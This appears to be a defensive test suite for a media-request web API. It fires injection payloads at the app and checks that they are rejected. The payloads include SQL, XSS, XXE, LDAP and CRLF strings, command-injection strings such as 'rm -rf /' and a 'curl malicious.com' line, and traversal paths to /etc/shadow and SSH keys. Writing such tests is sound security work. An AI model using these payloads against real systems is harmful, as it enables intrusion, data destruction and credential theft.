import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import request from 'supertest';
import { User } from '@prisma/client';

import { app } from '../../../src/server';
import { cleanDatabase, disconnectDatabase } from '../../helpers/database';
import { createTestUser, generateValidToken } from '../../helpers/auth';
import { UserRepository } from '../../../src/repositories/user.repository';
import { MediaRequestRepository } from '../../../src/repositories/media-request.repository';

describe('Input Validation and Injection Prevention Tests', () => {
  let userRepository: UserRepository;
  let mediaRequestRepository: MediaRequestRepository;
  let testUser: User;
  let adminUser: User;
  let testUserToken: string;
  let adminUserToken: string;

  beforeAll(async () => {
    userRepository = new UserRepository();
    mediaRequestRepository = new MediaRequestRepository();
  });

  beforeEach(async () => {
    await cleanDatabase();
    
    testUser = await createTestUser({
      email: 'test@example.com',
      name: 'Test User',
      plexId: 'plex-123',
      role: 'user',
    });

    adminUser = await createTestUser({
      email: 'admin@example.com',
      name: 'Admin User',
      plexId: 'plex-admin',
      role: 'admin',
    });
    
    testUserToken = await generateValidToken(testUser.id);
    adminUserToken = await generateValidToken(adminUser.id);
  });

  afterAll(async () => {
    await disconnectDatabase();
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in user ID parameters', async () => {
      const maliciousIds = [
        "1' OR '1'='1",
        "1; DROP TABLE users; --",
        "1' UNION SELECT * FROM users --",
        "'; DELETE FROM users; --",
        "1' OR 1=1 --",
        "admin'/**/OR/**/1=1--",
        "1'||'1'='1",
      ];

      for (const maliciousId of maliciousIds) {
        const response = await request(app)
          .get(`/api/users/${encodeURIComponent(maliciousId)}`)
          .set('Authorization', `Bearer ${testUserToken}`);

        // Should be rejected by validation, not cause SQL injection
        expect([400, 403, 404]).toContain(response.status);
        expect(response.body.message).not.toContain('database error');
      }
    });

    it('should prevent SQL injection in search queries', async () => {
      const maliciousQueries = [
        "title'; DROP TABLE media_requests; --",
        "' OR 1=1 --",
        "'; INSERT INTO media_requests (title) VALUES ('hacked'); --",
        "' UNION SELECT password FROM users --",
        "movie' AND (SELECT COUNT(*) FROM users) > 0 --",
      ];

      for (const query of maliciousQueries) {
        const response = await request(app)
          .get('/api/media-requests')
          .query({ search: query })
          .set('Authorization', `Bearer ${testUserToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toHaveProperty('data');
        expect(Array.isArray(response.body.data)).toBe(true);
      }
    });

    it('should prevent SQL injection in filter parameters', async () => {
      const maliciousFilters = {
        status: "pending'; DROP TABLE media_requests; --",
        mediaType: "movie' OR '1'='1",
        createdAfter: "'; DELETE FROM users; --",
        userId: "1' OR 1=1 --",
      };

      for (const [key, value] of Object.entries(maliciousFilters)) {
        const response = await request(app)
          .get('/api/media-requests')
          .query({ [key]: value })
          .set('Authorization', `Bearer ${testUserToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toHaveProperty('data');
      }
    });

    it('should prevent SQL injection in sorting parameters', async () => {
      const maliciousSort = [
        "title; DROP TABLE users; --",
        "createdAt' OR '1'='1",
        "status, (SELECT password FROM users LIMIT 1)",
      ];

      for (const sort of maliciousSort) {
        const response = await request(app)
          .get('/api/media-requests')
          .query({ sortBy: sort })
          .set('Authorization', `Bearer ${testUserToken}`);

        expect([200, 400]).toContain(response.status);
        if (response.status === 200) {
          expect(response.body).toHaveProperty('data');
        }
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should prevent NoSQL injection in query parameters', async () => {
      const noSqlInjections = [
        { $ne: null },
        { $gt: "" },
        { $where: "function() { return true; }" },
        { $regex: ".*" },
        { $in: ["admin", "user"] },
      ];

      for (const injection of noSqlInjections) {
        const response = await request(app)
          .get('/api/media-requests')
          .query({ status: JSON.stringify(injection) })
          .set('Authorization', `Bearer ${testUserToken}`);

        expect(response.status).toBe(200);
        // Should treat as string, not object
        expect(response.body).toHaveProperty('data');
      }
    });

    it('should prevent object injection in JSON bodies', async () => {
      const maliciousPayloads = [
        {
          title: "Test Movie",
          mediaType: { $ne: "movie" },
          tmdbId: "12345",
        },
        {
          title: "Test Movie",
          mediaType: "movie",
          userId: { $ne: testUser.id },
          tmdbId: "12345",
        },
        {
          title: "Test Movie",
          mediaType: "movie",
          tmdbId: { $where: "true" },
        },
      ];

      for (const payload of maliciousPayloads) {
        const response = await request(app)
          .post('/api/media-requests')
          .set('Authorization', `Bearer ${testUserToken}`)
          .send(payload);

        // Should be rejected by validation or handled safely
        expect([200, 201, 400]).toContain(response.status);
        if (response.status === 201) {
          expect(typeof response.body.mediaType).toBe('string');
        }
      }
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize HTML in text fields', async () => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<div onmouseover='alert(\"XSS\")'>hover me</div>",
        "';alert('XSS');//",
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/media-requests')
          .set('Authorization', `Bearer ${testUserToken}`)
          .send({
            title: payload,
            mediaType: 'movie',
            tmdbId: '12345',
          });

        if (response.status === 201) {
          expect(response.body.title).not.toContain('<script>');
          expect(response.body.title).not.toContain('<img');
          expect(response.body.title).not.toContain('<svg');
          expect(response.body.title).not.toContain('javascript:');
          expect(response.body.title).not.toContain('<iframe');
          expect(response.body.title).not.toContain('onmouseover');
        }
      }
    });

    it('should prevent XSS in user profile updates', async () => {
      const xssName = "<script>alert('Profile XSS')</script>";
      
      const response = await request(app)
        .patch(`/api/users/${testUser.id}`)
        .set('Authorization', `Bearer ${testUserToken}`)
        .send({ name: xssName });

      if (response.status === 200) {
        expect(response.body.name).not.toContain('<script>');
        expect(response.body.name).not.toContain('alert');
      }
    });

    it('should escape special characters in API responses', async () => {
      const mediaRequest = await mediaRequestRepository.create({
        userId: testUser.id,
        title: 'Movie with "quotes" & special chars <test>',
        mediaType: 'movie',
        tmdbId: '12345',
      });

      const response = await request(app)
        .get(`/api/media-requests/${mediaRequest.id}`)
        .set('Authorization', `Bearer ${testUserToken}`);

      expect(response.status).toBe(200);
      expect(response.body.title).toBe('Movie with "quotes" & special chars <test>');
      // Response should be JSON-encoded properly
      expect(typeof response.body.title).toBe('string');
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in file operations', async () => {
      const maliciousFileNames = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& whoami",
        "$(rm -rf /tmp/*)",
        "`cat /etc/shadow`",
        "file.txt; curl malicious.com",
      ];

      for (const fileName of maliciousFileNames) {
        const response = await request(app)
          .post('/api/media-requests')
          .set('Authorization', `Bearer ${testUserToken}`)
          .send({
            title: fileName,
            mediaType: 'movie',
            tmdbId: '12345',
          });

        // Should be handled safely
        expect([200, 201, 400]).toContain(response.status);
      }
    });

    it('should prevent command injection in search operations', async () => {
      const maliciousSearchTerms = [
        "; ls -la",
        "| cat /etc/hosts",
        "&& id",
        "$(whoami)",
        "`ps aux`",
        "search; netstat -an",
      ];

      for (const searchTerm of maliciousSearchTerms) {
        const response = await request(app)
          .get('/api/media-requests')
          .query({ search: searchTerm })
          .set('Authorization', `Bearer ${testUserToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toHaveProperty('data');
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal in API paths', async () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%5c..%5c..%5cetc%5cpasswd',
      ];

      for (const path of maliciousPaths) {
        const response = await request(app)
          .get(`/api/users/${encodeURIComponent(path)}`)
          .set('Authorization', `Bearer ${testUserToken}`);

        expect([400, 403, 404]).toContain(response.status);
        expect(response.body.message).not.toContain('passwd');
        expect(response.body.message).not.toContain('system32');
      }
    });

    it('should prevent path traversal in file parameters', async () => {
      const traversalAttempts = [
        '../config/database.json',
        '../../.env',
        '../../../root/.ssh/id_rsa',
        'config/../../../etc/shadow',
      ];

      for (const attempt of traversalAttempts) {
        const response = await request(app)
          .post('/api/media-requests')
          .set('Authorization', `Bearer ${testUserToken}`)
          .send({
            title: 'Test Movie',
            mediaType: 'movie',
            tmdbId: '12345',
            filePath: attempt, // If such parameter exists
          });

        expect([200, 201, 400]).toContain(response.status);
      }
    });
  });

  describe('Header Injection Prevention', () => {
    it('should prevent CRLF injection in custom headers', async () => {
      const maliciousHeaders = [
        'value\r\nX-Injected: true',
        'value\nSet-Cookie: admin=true',
        'value\r\n\r\n<script>alert("XSS")</script>',
        'value%0d%0aX-Injected:%20true',
      ];

      for (const headerValue of maliciousHeaders) {
        const response = await request(app)
          .get('/api/users/me')
          .set('Authorization', `Bearer ${testUserToken}`)
          .set('X-Custom-Header', headerValue);

        expect(response.status).toBe(200);
        expect(response.headers).not.toHaveProperty('x-injected');
        expect(response.headers['set-cookie']).not.toContain('admin=true');
      }
    });

    it('should prevent response splitting attacks', async () => {
      const response = await request(app)
        .get('/api/users/me')
        .set('Authorization', `Bearer ${testUserToken}`)
        .set('User-Agent', 'TestAgent\r\nX-Malicious: true\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert("XSS")</script>');

      expect(response.status).toBe(200);
      expect(response.text).not.toContain('<script>');
      expect(response.headers).not.toHaveProperty('x-malicious');
    });
  });

  describe('JSON Injection Prevention', () => {
    it('should prevent JSON structure manipulation', async () => {
      const maliciousJson = {
        title: 'Test Movie',
        mediaType: 'movie',
        tmdbId: '12345',
        '__proto__': { isAdmin: true },
        'constructor': { prototype: { isAdmin: true } },
      };

      const response = await request(app)
        .post('/api/media-requests')
        .set('Authorization', `Bearer ${testUserToken}`)
        .send(maliciousJson);

      if (response.status === 201) {
        expect(response.body).not.toHaveProperty('isAdmin');
        expect(response.body).not.toHaveProperty('__proto__');
        expect(response.body).not.toHaveProperty('constructor');
      }
    });

    it('should prevent prototype pollution', async () => {
      const pollutionPayloads = [
        { '__proto__.polluted': 'yes' },
        { 'constructor.prototype.polluted': 'yes' },
        { '__proto__': { 'polluted': 'yes' } },
      ];

      for (const payload of pollutionPayloads) {
        await request(app)
          .post('/api/media-requests')
          .set('Authorization', `Bearer ${testUserToken}`)
          .send({
            title: 'Test Movie',
            mediaType: 'movie',
            tmdbId: '12345',
            ...payload,
          });

        // Check if prototype was polluted
        expect({}.polluted).toBeUndefined();
        expect(Object.prototype.polluted).toBeUndefined();
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should prevent LDAP injection in user lookups', async () => {
      const ldapInjections = [
        'admin)(|(password=*))',
        'user)(&(password=*))',
        '*)(uid=*))(|(uid=*',
        'admin)(&(|(objectClass=*)))',
        'test*)(|(objectClass=*)',
      ];

      for (const injection of ldapInjections) {
        const response = await request(app)
          .get('/api/users/search')
          .query({ query: injection })
          .set('Authorization', `Bearer ${adminUserToken}`);

        expect([200, 400, 404]).toContain(response.status);
        if (response.status === 200) {
          expect(response.body).toHaveProperty('data');
          expect(Array.isArray(response.body.data)).toBe(true);
        }
      }
    });
  });

  describe('XML/XXE Prevention', () => {
    it('should prevent XML external entity attacks', async () => {
      const xxePayloads = [
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM \'file:///etc/shadow\'>]><root>&test;</root>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://malicious.com/evil.dtd"> %xxe;]>',
      ];

      for (const payload of xxePayloads) {
        const response = await request(app)
          .post('/api/media-requests')
          .set('Authorization', `Bearer ${testUserToken}`)
          .set('Content-Type', 'application/xml')
          .send(payload);

        // Should be rejected as invalid content type or handled safely
        expect([400, 415]).toContain(response.status);
      }
    });
  });

  describe('Mass Assignment Prevention', () => {
    it('should prevent mass assignment of protected fields', async () => {
      const maliciousUpdate = {
        name: 'Updated Name',
        role: 'admin', // Protected field
        status: 'active', // Protected field
        plexToken: 'hacked-token', // Protected field
        passwordHash: 'hacked-password', // Protected field
        id: 'new-id', // Protected field
      };

      const response = await request(app)
        .patch(`/api/users/${testUser.id}`)
        .set('Authorization', `Bearer ${testUserToken}`)
        .send(maliciousUpdate);

      if (response.status === 200) {
        expect(response.body.name).toBe('Updated Name');
        expect(response.body.role).toBe('user'); // Should not change
        expect(response.body.id).toBe(testUser.id); // Should not change
        expect(response.body).not.toHaveProperty('passwordHash');
        expect(response.body).not.toHaveProperty('plexToken');
      }
    });

    it('should prevent creation with protected fields', async () => {
      const maliciousCreateData = {
        email: 'newuser@test.com',
        name: 'New User',
        role: 'admin', // Should be filtered out
        status: 'active', // Should use default
        plexToken: 'unauthorized-token',
        passwordHash: 'direct-hash',
      };

      const response = await request(app)
        .post('/api/admin/users')
        .set('Authorization', `Bearer ${adminUserToken}`)
        .send(maliciousCreateData);

      if (response.status === 201) {
        expect(response.body.email).toBe('newuser@test.com');
        expect(response.body.role).not.toBe('admin'); // Should use default
        expect(response.body).not.toHaveProperty('passwordHash');
        expect(response.body).not.toHaveProperty('plexToken');
      }
    });
  });

  describe('Regular Expression DoS Prevention', () => {
    it('should prevent ReDoS attacks in validation', async () => {
      const redosPayloads = [
        'a'.repeat(100000) + '!',
        '(' + 'a'.repeat(50000) + ')*',
        'a'.repeat(10000) + 'X',
        'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
      ];

      for (const payload of redosPayloads) {
        const startTime = Date.now();
        
        const response = await request(app)
          .post('/api/media-requests')
          .set('Authorization', `Bearer ${testUserToken}`)
          .send({
            title: payload,
            mediaType: 'movie',
            tmdbId: '12345',
          });

        const duration = Date.now() - startTime;
        
        // Should not take more than 5 seconds
        expect(duration).toBeLessThan(5000);
        expect([200, 201, 400]).toContain(response.status);
      }
    });

    it('should handle malicious email patterns', async () => {
      const maliciousEmails = [
        'a'.repeat(1000) + '@example.com',
        'test@' + 'a'.repeat(1000) + '.com',
        'test+' + 'a'.repeat(500) + '@example.com',
      ];

      for (const email of maliciousEmails) {
        const startTime = Date.now();
        
        const response = await request(app)
          .patch(`/api/users/${testUser.id}`)
          .set('Authorization', `Bearer ${testUserToken}`)
          .send({ email });

        const duration = Date.now() - startTime;
        
        expect(duration).toBeLessThan(2000);
        expect([200, 400]).toContain(response.status);
      }
    });
  });

  describe('Buffer Overflow Prevention', () => {
    it('should handle extremely large payloads gracefully', async () => {
      const largeTitle = 'A'.repeat(10000);
      
      const response = await request(app)
        .post('/api/media-requests')
        .set('Authorization', `Bearer ${testUserToken}`)
        .send({
          title: largeTitle,
          mediaType: 'movie',
          tmdbId: '12345',
        });

      expect([400, 413]).toContain(response.status); // Bad request or payload too large
    });

    it('should limit request body size', async () => {
      const hugePayload = {
        title: 'Test Movie',
        mediaType: 'movie',
        tmdbId: '12345',
        largeField: 'x'.repeat(1000000), // 1MB of data
      };

      const response = await request(app)
        .post('/api/media-requests')
        .set('Authorization', `Bearer ${testUserToken}`)
        .send(hugePayload);

      expect([400, 413]).toContain(response.status);
    });
  });

  describe('Input Sanitization', () => {
    it('should properly encode special characters', async () => {
      const specialChars = {
        title: 'Movie & TV Show "Special" <Episode>',
        mediaType: 'movie',
        tmdbId: '12345',
      };

      const response = await request(app)
        .post('/api/media-requests')
        .set('Authorization', `Bearer ${testUserToken}`)
        .send(specialChars);

      if (response.status === 201) {
        expect(response.body.title).toContain('&');
        expect(response.body.title).toContain('"');
        expect(response.body.title).toContain('<');
        expect(response.body.title).toContain('>');
        // Should preserve legitimate special characters
      }
    });

    it('should handle Unicode and multibyte characters', async () => {
      const unicodeTest = {
        title: '🎬 Movie Title with émojis and spëcial chars 中文',
        mediaType: 'movie',
        tmdbId: '12345',
      };

      const response = await request(app)
        .post('/api/media-requests')
        .set('Authorization', `Bearer ${testUserToken}`)
        .send(unicodeTest);

      if (response.status === 201) {
        expect(response.body.title).toContain('🎬');
        expect(response.body.title).toContain('émojis');
        expect(response.body.title).toContain('中文');
      }
    });
  });
});